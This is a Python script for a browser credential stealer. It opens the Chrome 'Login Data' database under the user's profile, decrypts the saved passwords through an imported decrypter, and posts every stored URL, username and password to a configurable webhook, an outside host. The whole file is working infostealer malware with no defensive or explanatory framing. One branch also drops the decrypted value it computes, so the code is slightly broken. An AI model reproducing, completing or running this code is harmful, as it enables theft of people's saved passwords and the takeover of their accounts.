import os
import json
import sqlite3
import shutil
import requests

from password_decrypter import ChromePWDecrypter


class Chrome_PE:
    def __init__(self, webhook_url=""):
        # Communication
        self.webhook_url = webhook_url
        # Db
        self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
        self.rows = self.extract_db_rows()   
        # Encryption
        self.decrypter = ChromePWDecrypter(self.db_path)         
    # ENCRYPTION RELATED
    def decrypt_password(self, password):
        if not password:
            return "NoPasswordFound"
        try:
            # Check for v10/v11 encrypted password (starts with 'v10' or 'v11')
            if password.startswith(b'v10') or password.startswith(b'v11'):
                self.decrypter.decrypt_old(password)
            elif password.startswith(b'v20'):
                return self.decrypter.decrypt_new(password)
            else:
                # Try legacy DPAPI decryption (Chrome < v80)
                return self.decrypter.decrypt_default(password)
                
        except Exception as e:
            # Log the error for debugging (optional)
            # print(f"Decryption error: {str(e)}")
            return str(e)
    # DB RELATED
    def extract_db_rows(self):
        db = sqlite3.connect(self.db_path)
        cursor = db.cursor()
        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        
        # iterate over all rows
        return [[x[0],x[2],x[3]] for x in cursor.fetchall()]
    # APP RELATED
    def send_webhook(self,data):
        data = {"content" :  data}
        requests.post(self.webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
    def execute(self):
        self.rows = [[x[0],x[1],self.decrypt_password(x[2])] for x in self.rows]
        for row in self.rows:
            self.send_webhook(f" {'-'*10} \n**URL** : {row[0]} \n**USERNAME** : {row[1]} \n**PASSWORD** : {row[2]} \n {'-'*10} ")
    
if __name__ == "__main__":
    PE = Chrome_PE(
        webhook_url="your-webook-url",
    )
    PE.execute()   